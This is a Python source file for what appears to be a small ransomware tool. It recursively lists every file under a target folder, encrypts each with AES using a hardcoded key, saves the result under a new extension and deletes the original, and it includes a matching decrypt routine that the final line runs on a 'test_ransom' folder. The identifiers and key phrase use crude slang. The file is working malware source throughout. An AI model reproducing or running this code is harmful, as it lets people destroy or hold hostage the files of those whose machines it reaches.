#!/bin/python3
from Crypto.Cipher import AES
from Crypto import Random
import hashlib
import base64
import codecs
import re, os


codecs.register(lambda name: codecs.lookup('utf8') if name == 'utf8mb4' else None)

__key__ = hashlib.sha256(b'kontolnjepat').digest()[:16]

def encrypt(data, size):    
    data = data + '\0' * (size - len(data) % size)
    data = data.encode('utf8mb4')
    iv = Random.new().read(AES.block_size)
    aes_new = AES.new(__key__, AES.MODE_CFB, iv)
    return base64.b64encode(iv + aes_new.encrypt(data)).decode('utf8mb4')

def decrypt(data):
    bs4 = base64.b64decode(data)
    iv = bs4[:16]
    cipher = AES.new(__key__, AES.MODE_CFB, iv)
    return re.sub(b'\x00*$', b'', cipher.decrypt(bs4[16:])).decode('utf8mb4')

class GasskuenCok:
    def __init__(self, path_target, extension='kontol'):
        self.path = path_target
        self.extension = extension
    
    def search(self, path):
        search = os.listdir(path)
        return_files = list()
        for files in search:
            full_path = os.path.join(path, files)
            if os.path.isdir(full_path):
                return_files = return_files + self.search(full_path)
            else:
                return_files.append(full_path)
        return return_files

    def gasskeun_encrypt(self):
        list_all_files = self.search(self.path)
        for list_files in list_all_files:
            print(f"Encrypt File : {list_files}")
            x = open(list_files,'r').read()
            values_encrypt = encrypt(x, 32)
            new_file = open(f"{list_files}.{self.extension}",'a')
            new_file.write(values_encrypt)
            new_file.close()
            print(f"Encrypted : {list_files}.{self.extension}")
            os.unlink(list_files)
    
    def gasskeun_decrypt(self):
        list_all_files = self.search(self.path)
        for list_files in list_all_files:
            print(f"Decrypt File : {list_files}")
            x = open(list_files, 'r').read()
            values_decrypt = decrypt(x)
            paths = os.path.dirname(list_files)
            welcome_back_extension = '.'.join(os.path.basename(list_files).split('.')[:2])
            full_path = os.path.join(paths, welcome_back_extension)
            new_file = open(full_path,'a')
            new_file.write(values_decrypt)
            new_file.close()
            os.unlink(list_files)

GasskuenCok(os.path.join(os.getcwd(), 'test_ransom')).gasskeun_decrypt()
